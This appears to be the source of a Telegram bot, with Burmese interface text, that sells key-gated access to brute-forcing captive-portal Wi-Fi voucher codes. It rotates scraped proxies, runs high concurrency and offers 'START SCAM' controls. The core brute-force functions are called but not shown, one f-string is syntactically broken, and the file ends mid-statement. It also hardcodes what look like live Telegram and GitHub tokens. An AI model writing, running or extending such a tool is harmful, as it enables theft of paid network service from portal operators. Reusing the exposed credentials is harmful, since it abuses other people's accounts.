import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from pathlib import Path
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
import cv2
import ddddocr
import numpy as np
from datetime import datetime, timedelta, timezone

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8979076098:AAHMXQwNQVq3Q-BJ0upKLkYEJG4DVMLYdLc"
GITHUB_TOKEN = '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'
REPO_OWNER = "kohtunlinaung"
REPO_NAME = "codehack"

ADMINS = [
    "8690698115"
]

ADMIN_USERNAME = "@arsarstarlinkai_bot"

# ==================== DRAGON BRANDING ====================
# Telegram-friendly logo used consistently across the bot UI.
DRAGON_LOGO = """╔══════════════════════════════╗
║         ░D░E░X░  DEV        ║
╚══════════════════════════════╝"""
DRAGON_DIVIDER = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

def is_admin(user_id):
    return str(user_id) in ADMINS

# ==================== PROXY AUTO UPDATE ====================
PROXY_SOURCES = [
    "https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
    "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/all/data.txt",
    "https://raw.githubusercontent.com/proxmint/free-proxy-list/main/proxies/http.txt",
]

PROXY_LIST = []
_proxy_index = 0
last_proxy_update = 0

def fetch_proxies_sync():
    """အွန်လိုင်းကနေ Proxy တွေကို ဆွဲယူမယ်"""
    global PROXY_LIST, last_proxy_update
    all_proxies = set()
    for url in PROXY_SOURCES:
        try:
            import requests
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                for line in r.text.split("\n"):
                    line = line.strip()
                    if line and ":" in line and not line.startswith("#"):
                        all_proxies.add(line)
        except:
            pass
    PROXY_LIST = list(all_proxies)
    last_proxy_update = time.time()
    print(f"✓ Proxy {len(PROXY_LIST)} ခု ရယူပြီး")
    return PROXY_LIST

async def fetch_proxies_async():
    """Async နဲ့ Proxy ဆွဲယူမယ်"""
    global PROXY_LIST, last_proxy_update
    all_proxies = set()
    for url in PROXY_SOURCES:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=5) as response:
                    if response.status == 200:
                        text = await response.text()
                        for line in text.split("\n"):
                            line = line.strip()
                            if line and ":" in line and not line.startswith("#"):
                                all_proxies.add(line)
        except:
            pass
    PROXY_LIST = list(all_proxies)
    last_proxy_update = time.time()
    print(f"✓ Proxy {len(PROXY_LIST)} ခု ရယူပြီး")
    return PROXY_LIST

async def auto_update_proxies():
    """မိနစ် ၃၀ တစ်ခါ Proxy အလိုအလျောက် update လုပ်မယ်"""
    while True:
        await fetch_proxies_async()
        await asyncio.sleep(1800)  # ၃၀ မိနစ်

def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return f"http://{proxy}"

# ==================== PROXY STATUS COMMAND ====================
async def show_proxy_status(message):
    """Proxy အရေအတွက်နဲ့ update ချိန်ပြမယ်"""
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    if last_proxy_update > 0:
        update_time = datetime.fromtimestamp(last_proxy_update).strftime('%Y-%m-%d %H:%M:%S')
    else:
        update_time = "Never"
    await bot.reply_to(
        message,
        f"◉ **Proxy Status**\n\n"
        f"🌐 Total Proxies: {len(PROXY_LIST)}\n"
        f"↻ Last Update: {update_time}\n"
        f"◆ Sources: {len(PROXY_SOURCES)}"
    )

# ==================== KEYBOARDS ====================
def get_main_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✦ VIP USER", callback_data="menu_paid"),
        InlineKeyboardButton("✧ Portal URL ထည့်ရန်", callback_data="menu_free_trial"),
        InlineKeyboardButton("✓ Success Codes", callback_data="menu_result"),
        InlineKeyboardButton("♻️ Recheck", callback_data="menu_recheck"),
        InlineKeyboardButton("■ Scan ရပ်မည်", callback_data="menu_stop"),
        InlineKeyboardButton("‹ နောက်သို့", callback_data="menu_back")
    )
    return keyboard

def get_voucher_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("◇ 6 လုံး", callback_data="scan_6"),
        InlineKeyboardButton("◇ 7 လုံး", callback_data="scan_7"),
        InlineKeyboardButton("◇ 8 လုံး", callback_data="scan_8"),
        InlineKeyboardButton("◇ 9 လုံး", callback_data="scan_9"),
        InlineKeyboardButton("Aa a-z 6", callback_data="scan_ascii-lower"),
        InlineKeyboardButton("Aa a-z 9", callback_data="scan_ascii-lower9"),
        InlineKeyboardButton("⇄ A-Z+0-9 6", callback_data="scan_all"),
        InlineKeyboardButton("⇄ 6 Mixed", callback_data="scan_mixed"),
        InlineKeyboardButton("⇄ 7 Mixed", callback_data="scan_mixed7"),
        InlineKeyboardButton("⇄ 8 Mixed", callback_data="scan_mixed8"),
        InlineKeyboardButton("⇄ 9 Mixed", callback_data="scan_mixed9"),
        InlineKeyboardButton("‹ နောက်သို့", callback_data="menu_back")
    )
    return keyboard

def get_digit_keyboard(mode):
    keyboard = InlineKeyboardMarkup(row_width=5)
    buttons = []
    digit_emojis = ["⓪", "①", "②", "③", "④", "⑤", "⑥", "⑦", "⑧", "⑨"]
    for i in range(10):
        buttons.append(InlineKeyboardButton(digit_emojis[i], callback_data=f"digit_{mode}_{i}"))
    keyboard.add(*buttons)
    keyboard.add(InlineKeyboardButton("⤨ Random", callback_data=f"digit_{mode}_random"))
    keyboard.add(InlineKeyboardButton("‹ နောက်သို့", callback_data="menu_back"))
    return keyboard

def get_start_scam_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("♛ Owner by @DogGod7475", callback_data="menu_owner"),
        InlineKeyboardButton("✉ Telegram @DogGod7475", callback_data="menu_telegram"),
        InlineKeyboardButton("+ Add Proxies", callback_data="menu_add_proxies"),
        InlineKeyboardButton("✦ Update Portal", callback_data="menu_update_portal"),
        InlineKeyboardButton("☷ Mode", callback_data="menu_scan_mode"),
        InlineKeyboardButton("◉ Current Mode: running", callback_data="menu_mode"),
        InlineKeyboardButton("◇ Proxies: 0/0", callback_data="menu_proxies"),
        InlineKeyboardButton("▶ START SCAN", callback_data="menu_start_scam"),
        InlineKeyboardButton("■ STOP SCAN", callback_data="menu_stop"),
        InlineKeyboardButton("‹ Back", callback_data="menu_back")
    )
    return keyboard

def get_paid_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("✓ VIP ဖြစ်ရန်", callback_data="menu_enter_userid"),
        InlineKeyboardButton("‹ နောက်သို့", callback_data="menu_back")
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(InlineKeyboardButton("‹ နောက်သို့", callback_data="menu_back"))
    return keyboard

def get_scam_button_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("■ STOP SCAM", callback_data="menu_stop"),
        InlineKeyboardButton("‹ နောက်သို့", callback_data="menu_back")
    )
    return keyboard

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
approve = {}
scan_tasks = {}

# ==================== LOCAL STORAGE ====================
# Keys and scan results are stored locally; no GitHub connection is required.
DATA_DIR = Path(__file__).resolve().parent / "dragon_data"
DATA_DIR.mkdir(parents=True, exist_ok=True)
LOCAL_DATA_LOCK = asyncio.Lock()

def _local_data_path(path):
    """Return a safe local JSON path for the requested data file."""
    filename = Path(path).name
    if filename not in {"auth_list.json", "result.json"}:
        raise ValueError(f"Unsupported local data file: {filename}")
    return DATA_DIR / filename

def _read_local_json(path):
    file_path = _local_data_path(path)
    if not file_path.exists():
        return {}
    try:
        with file_path.open("r", encoding="utf-8") as file:
            data = json.load(file)
            return data if isinstance(data, dict) else {}
    except (json.JSONDecodeError, OSError) as error:
        print(f"Local storage read error ({file_path.name}): {error}")
        return {}

async def _write_local_json(path, content):
    file_path = _local_data_path(path)
    temp_path = file_path.with_suffix(".json.tmp")
    payload = content if isinstance(content, dict) else {}
    async with LOCAL_DATA_LOCK:
        with temp_path.open("w", encoding="utf-8") as file:
            json.dump(payload, file, ensure_ascii=False, indent=2)
        temp_path.replace(file_path)

for _data_file in ("auth_list.json", "result.json"):
    _data_path = _local_data_path(_data_file)
    if not _data_path.exists():
        _data_path.write_text("{}\n", encoding="utf-8")

# Key access is granted only after an admin generates a key for the user.
async def has_active_access(chat_id):
    if is_admin(chat_id):
        return True
    access = approve.get(chat_id)
    if isinstance(access, dict):
        return access.get("approved") is True and check_key_expiration(access)
    return access is True

async def send_key_required(message):
    await bot.reply_to(
        message,
        "▣ Access Key လိုအပ်ပါသည်။\n\n"
        "Admin ထံမှ ရရှိသော key ကို အောက်ပါအတိုင်း ပို့ပါ။\n"
        "/key YOUR-KEY"
    )
success_messages = {}
success_texts = {}
limited_messages = {}
limited_texts = {}
captcha_state = {}
session = None
_connector = None
CONCURRENCY = 5000
_voucher_sem = None
_start_time = time.monotonic()

MAX_CONCURRENT_SCANS = 35
active_scans_count = 0
active_scans_lock = asyncio.Lock()

async def handle(request):
    return web.Response(text="Bot is awake and running 24/7!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

async def get_file_content(path):
    # Keep the old function name so existing commands need no other changes.
    return _read_local_json(path), None

async def update_file_content(path, content, sha, message):
    # sha/message are retained for call-site compatibility and are not needed locally.
    await _write_local_json(path, content)
    return "local storage updated"

# ==================== START COMMAND ====================
@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or message.from_user.username or "User"
    
    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}
    
    welcome_text = f"""{DRAGON_LOGO}

✦ ░D░E░X░ 
◉ NAME: {user_name}
🆔 USER ID: {user_id}

✦ မင်္ဂလာပါခင်ဗျာ!
▣ အသုံးပြုရန် Admin ထံမှ Access Key ရယူပါ။
/key YOUR-KEY ဖြင့် key ထည့်သွင်းနိုင်ပါသည်။

အောက်ပါ Menu မှ သင်လိုချင်တာကိုရွေးချယ်ပါ။"""
    
    await bot.send_message(message.chat.id, welcome_text, reply_markup=get_main_keyboard())

# ==================== CALLBACK HANDLER ====================
@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)
    user_name = call.from_user.first_name or call.from_user.username or "User"

    if call.data not in ("menu_back", "menu_paid", "menu_enter_userid") and not await has_active_access(chat_id):
        await bot.answer_callback_query(call.id, "▣ Admin key လိုအပ်ပါသည်။", show_alert=True)
        return
    
    if call.data == "menu_back":
        text = f"""{DRAGON_LOGO}

✦ ░D░E░X░

◉ NAME: {user_name}
🆔 USER ID: {user_id}

✓ VIP USER - Unlimited Access"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_main_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_add_proxies":
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="""+ Add Proxies

Proxy များကို အောက်ပါအတိုင်း တစ်ကြောင်းချင်းစီ ထည့်သွင်းပါ။

ဥပမာ:
130.110.103.245:3128
213.131.85.29:1976
1.231.81.166:3128

ထည့်သွင်းပြီးပါက Bot က အလိုအလျောက် သိမ်းဆည်းပေးပါမည်။""",
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_update_portal":
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="""✦ Update Portal

Portal URL ကို တန်းပို့ပါ။

ဥပမာ:
https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00""",
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_scan_mode":
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="☷ Scan Mode ရွေးချယ်ရန်:",
            reply_markup=get_voucher_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_free_trial":
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="""✧ Portal URL ထည့်သွင်းရန်:

URL ကို တန်းပို့ပါ။""",
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_start_scam":
        global active_scans_count, active_scans_lock
        async with active_scans_lock:
            if active_scans_count >= MAX_CONCURRENT_SCANS:
                await bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=call.message.message_id,
                    text=f"! Bot အလုပ်များနေပါသည်။ လက်ရှိ {active_scans_count}/{MAX_CONCURRENT_SCANS} ယောက် scan လုပ်နေပါသည်။\n\nခဏစောင့်ပြီးမှ ထပ်ကြိုးစားပါ။",
                    reply_markup=get_back_keyboard()
                )
                await bot.answer_callback_query(call.id)
                return
            active_scans_count += 1
        
        if chat_id not in user_data or 'selected_mode' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="× VOUCHER အမျိုးအစားမရွေးရသေးပါ။ ကျေးဇူးပြု၍ VOUCHER အရင်ရွေးပါ။",
                reply_markup=get_voucher_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        mode = user_data[chat_id]['selected_mode']
        start_digit = user_data[chat_id].get('start_digit')
        
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="✧ ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"{DRAGON_LOGO}\n\nScan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
                reply_markup=get_scam_button_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=f"{DRAGON_LOGO}\n\n⌕ Scan စတင်နေပါသည်...\n\n# VOUCHER Mode: {mode}\n\n■ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
            reply_markup=get_scam_button_keyboard(),
            parse_mode="Markdown"
        )
        
        progress_msg = await bot.send_message(chat_id, f"""{DRAGON_LOGO}

⏹️ STOP SCAM
{░D░E░X░}
𖤐 Tried: 0
𓂀 Current Code: 000000
♛ Hits: 0
⌛ Expired: 0
⛓ Limits: 0
⟡ Speed: 0.0 c/m
◇ Proxies: 0/0
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
◆ Hit Codes:
None yet""")
        scan_id = str(uuid.uuid4())

        task = asyncio.create_task(
            run_bruteforce(
                mode,
                chat_id,
                user_data[chat_id]['session_url'],
                scan_id,
                message=call.message,
                progress_msg=progress_msg,
                start_digit=start_digit
            )
        )
        
        scan_tasks[chat_id] = {
            "task": task,
            "stop": False,
            "scan_id": scan_id
        }
        
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_paid":
        text = f"""✦ VIP ACCESS ရယူရန်

USER ID: {user_id}

✓ အထက်ပါ USER ID ကို Admin ထံ ပေးပို့ပြီး Key ရယူပါ။
👨‍💻 Admin: {ADMIN_USERNAME}

Key ရရှိပြီးပါက အောက်ပါ command ကို ပို့ပါ။
/key YOUR-KEY"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_paid_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_enter_userid":
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="▣ Key ထည့်သွင်းရန်\n\nAdmin ထံမှ ရရှိသော key ကို ပို့ပါ။\nဥပမာ: /key DG-AB12-CD34",
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_result":
        results, _ = await get_file_content("result.json")
        if user_id in results and results[user_id]:
            codes = "\n".join(results[user_id])
            text = f"✓ Found Codes:\n{codes}"
        else:
            text = "☷ သင့်တွင် ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_back_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_recheck":
        if chat_id not in user_data or 'session_url' not in user_data.get(chat_id, {}):
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="✧ ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text="↻ Recheck ကို စတင်နေပါသည်...",
            reply_markup=get_scam_button_keyboard()
        )
        await recheck_command(call.message)
        await bot.answer_callback_query(call.id)
        return
    
    if call.data == "menu_stop":
        await stop_scan_command(call.message)
        await bot.answer_callback_query(call.id, "■ Scan ကိုရပ်တန့်လိုက်ပါပြီ။", show_alert=True)
        return
    
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        
        if 'session_url' not in user_data[chat_id]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text="✧ ကျေးဇူးပြု၍ Portal URL ကိုအရင်ထည့်သွင်းပါ:\n\n/portal [your_portal_url]",
                reply_markup=get_back_keyboard()
            )
            await bot.answer_callback_query(call.id)
            return

        if mode in ["6", "7", "8", "9"]:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=call.message.message_id,
                text=f"◇ VOUCHER {mode} လုံးအတွက် ထိပ်စီးနံပါတ်ရွေးပါ -",
                reply_markup=get_digit_keyboard(mode)
            )
            await bot.answer_callback_query(call.id)
            return

        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None
        
        text = f"""{DRAGON_LOGO}

⌕ သင်ရွေးချယ်ထားသော VOUCHER အမျိုးအစား: {mode}

✓ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။
■ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။"""
        
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text,
            reply_markup=get_start_scam_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    if call.data.startswith("digit_"):
        parts = call.data.split("_")
        mode = parts[1]
        digit = parts[2]
        
        if chat_id not in user_data:
            user_data[chat_id] = {}
        user_data[chat_id]['selected_mode'] = mode
        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
        
        text = f"{DRAGON_LOGO}\n\n⌕ VOUCHER Mode: {mode}\n"
        if digit == "random":
            text += "# ထိပ်စီးနံပါတ်: Random ဖြစ်ရှာရန်"
        else:
            text += f"# ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"
            
        await bot.edit_message_text(
            chat_id=chat_id,
            message_id=call.message.message_id,
            text=text + "\n\n✓ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
            reply_markup=get_start_scam_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

# ==================== RECHECK COMMAND ====================
async def recheck_command(message):
    chat_id = message.chat.id
    if not await has_active_access(chat_id):
        await send_key_required(message)
        return
    
    results, sha = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        if message.chat.id not in user_data:
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        if "session_url" not in user_data.get(message.chat.id, {}):
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        codes = results[chat_id_str]
        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
        session_url_recheck = user_data[message.chat.id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(
                session_url_recheck,
                code,
                chat_id,
                scan_id=None,
                recheck=True,
                message=message
            )
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
        await bot.reply_to(message, f"✓ Rechecked Codes:\n\n{to_show}")
        await save_rechecked_codes(chat_id_str, recheck_list, sha)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

# ==================== KEY COMMANDS ====================
@bot.message_handler(commands=['key'])
async def handle_key(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2 or not args[1].strip():
        await bot.reply_to(message, "Usage: /key YOUR-KEY")
        return

    submitted_key = args[1].strip()
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        key_data = auth_list.get(submitted_key)
        if not isinstance(key_data, dict):
            await bot.reply_to(message, "× Key မမှန်ပါ။ Admin ထံ ဆက်သွယ်ပါ။")
            return

        if str(key_data.get("user_id")) != str(message.chat.id):
            await bot.reply_to(message, "× ဒီ key သည် သင့် USER ID အတွက် မဟုတ်ပါ။")
            return
        if key_data.get("approved") is not True:
            await bot.reply_to(message, "◷ Admin ခွင့်ပြုချက် မရသေးပါ။")
            return
        if not check_key_expiration(key_data):
            await bot.reply_to(message, "⌛ ဒီ key သက်တမ်းကုန်သွားပါပြီ။")
            return

        approve[message.chat.id] = key_data
        if message.chat.id not in user_data:
            user_data[message.chat.id] = {}
        plan = key_data.get("plan", "unknown")
        await bot.reply_to(message, f"✓ Access ခွင့်ပြုပါပြီ။\nPlan: {plan}", reply_markup=get_main_keyboard())
    except Exception as e:
        print(f"Error at key validation: {e}")
        await bot.reply_to(message, "× Key စစ်ဆေးရာတွင် အမှားဖြစ်နေပါသည်။")

@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            if isinstance(data, dict):
                lines.append(f"◇ {uid}\n   User ID: {data.get('user_id', 'unknown')}\n   Plan: {plan}\n   Expires: {expires_str}")
            else:
                lines.append(f"◉ {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"☷ Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey DG-AB12-CD34")
            return
        key = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        key_data = auth_list.get(key)
        if key not in auth_list:
            await bot.reply_to(message, f"Key {key} မတွေ့ပါ။")
            return
        del auth_list[key]
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Delete access key {key}"
        )
        target_user_id = str(key_data.get("user_id")) if isinstance(key_data, dict) else None
        if target_user_id and target_user_id.isdigit():
            approve.pop(int(target_user_id), None)
            user_data.pop(int(target_user_id), None)
        await bot.reply_to(
            message,
            f"✓ Key Deleted\n\nKEY : {key}"
        )
    except Exception as e:
        print(f"Error at delkey {e}")

@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 3:
            await bot.reply_to(message, "Usage:\n/genkey unlimited 123456789")
            return
        plan = args[1]
        user_id = args[2]
        expiry = generate_expiry(plan)
        if not expiry:
            await bot.reply_to(
                message,
                "Plans:\n30m\n1h\n1d\n7d\n1m\n1y\nunlimited"
            )
            return
        auth_list, sha = await get_file_content("auth_list.json")
        key = "DG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4)) + "-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
        while key in auth_list:
            key = "DG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4)) + "-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=4))
        auth_list[key] = {
            "user_id": user_id,
            "expires_at": expiry,
            "plan": plan,
            "approved": True,
            "created_by": str(message.chat.id)
        }
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Generate access key for {user_id}"
        )
        await bot.reply_to(
            message,
            f"✓ Key Generated\n\n"
            f"KEY : `{key}`\n"
            f"USER ID : {user_id}\n"
            f"PLAN : {plan}\n"
            f"EXPIRES : {expiry}",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Error at genkey {e}")

@bot.message_handler(commands=['result'])
async def handle_result(message):
    if not await has_active_access(message.chat.id):
        await send_key_required(message)
        return
    results, _ = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        codes = "\n".join(results[chat_id_str])
        await bot.reply_to(message, f"✓ Found Codes:\n{codes}")
    else:
        await bot.reply_to(message, "သင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။")

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == "9999-12-31T23:59:59Z":
                return True
            exp_time = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(
            int,
            expiration_time.split('-')
        )
        expiration_dt = datetime(
            year=yyyy,
            month=MM,
            day=dd,
            hour=hh,
            minute=mm,
            second=0,
            tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "1m": timedelta(days=30),
        "1y": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_current_time():
    return datetime.now(timezone.utc)

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    if not await has_active_access(message.chat.id):
        await send_key_required(message)
        return
    chat_id = message.chat.id
    user_id = str(chat_id)
    
    results, sha = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
        if message.chat.id not in user_data:
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        if "session_url" not in user_data.get(message.chat.id, {}):
            await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
            return
        codes = results[chat_id_str]
        await bot.reply_to(message, f"Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
        session_url_recheck = user_data[message.chat.id]["session_url"]
        recheck_list = []
        for code in codes:
            recode = await perform_check(
                session_url_recheck,
                code,
                chat_id,
                scan_id=None,
                recheck=True,
                message=message
            )
            if recode:
                recheck_list.append(recode)
        to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
        await bot.reply_to(message, f"✓ Rechecked Codes:\n\n{to_show}")
        await save_rechecked_codes(chat_id_str, recheck_list, sha)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

@bot.message_handler(func=lambda message: message.text and message.text.startswith("http"))
async def handle_url_input(message):
    if not await has_active_access(message.chat.id):
        await send_key_required(message)
        return
    chat_id = message.chat.id
    url = message.text.strip()
    
    if chat_id not in user_data:
        user_data[chat_id] = {}
    
    user_data[chat_id]['session_url'] = url
    
    await bot.reply_to(
        message, 
